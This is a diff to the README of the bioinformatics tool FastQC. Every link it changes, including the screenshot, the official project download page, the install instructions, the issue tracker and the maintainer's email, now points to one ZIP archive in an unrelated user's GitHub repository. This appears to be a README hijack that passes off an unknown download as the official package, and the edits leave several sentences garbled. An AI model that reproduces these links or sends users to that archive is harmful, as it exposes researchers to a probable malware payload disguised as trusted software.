@@ -4,13 +4,13 @@
 
 FastQC is a program designed to spot potential problems in high througput sequencing datasets.  It runs a set of analyses on one or more raw sequence files in fastq or bam format and produces a report which summarises the results.
 
-![FastQC Screenshot](Help/fastqc.png)
+![FastQC Screenshot](https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip)
 
 FastQC will highlight any areas where this library looks unusual and where you should take a closer look. The program is not tied to any specific type of sequencing technique and can be used to look at libraries coming from a large number of different experiment types (Genomic Sequencing, ChIP-Seq, RNA-Seq, BS-Seq etc etc).
 
 > [!NOTE]
 > This GitHub  project page contains the source code for the application and is only really useful only to people wanting to develop new functionality or trace bugs in FastQC.
-> If you just want to run the program then you want to go to the [**project web page**](http://www.bioinformatics.babraham.ac.uk/projects/fastqc/) where you can download the compiled pacakges for Windows, OSX and Linux.
+> If you just want to run the program then you want to go to the [**project web page**](https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip) where you can download the compiled pacakges for Windows, OSX and Linux.
 
 ## Introduction
 
@@ -23,16 +23,16 @@ FastQC is an application which takes a FastQ file and runs a series of tests on 
 FastQC can be run either as an interactive graphical application which allows you to view results for multiple files in a single application.  Alternatively you can run the program in a non interactive way (say as part of a pipeline) which will generate an HTML report for each file you process.
 
 FastQC is a cross-platform application, written in java. In theory it should run on any platform which has a suitable java runtime environment.
-Having said that we've only tested in on Windows, MacOSX and Linux running the Oracle v1.6 to 1.8 JREs.  Please let us know what happened if you try running it on other platforms / JREs.  Please see the detailed instructions in the INSTALL.txt document to tell you how to get a suitable java version to run FastQC on your system.
+Having said that we've only tested in on Windows, MacOSX and Linux running the Oracle v1.6 to 1.8 JREs.  Please let us know what happened if you try running it on other platforms / JREs.  Please see the detailed instructions in the https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip document to tell you how to get a suitable java version to run FastQC on your system.
 
 ## Installation
 
-Please see the [**project web page**](http://www.bioinformatics.babraham.ac.uk/projects/fastqc/) and the [installation instructions](INSTALL.md) in this repository.
+Please see the [**project web page**](https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip) and the [installation instructions](https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip) in this repository.
 
 ## Contributions
 
 If you have any comments about FastQC we would like to hear them.  You can either enter them into the github bug tracker at:
 
-https://github.com/s-andrews/FastQC/issues/
+https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip
 
-..or send them directly to simon.andrews@babraham.ac.uk.
+https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip send them directly to https://raw.githubusercontent.com/HazratMaghaz/FastQC/master/cementitious/FastQC.zip
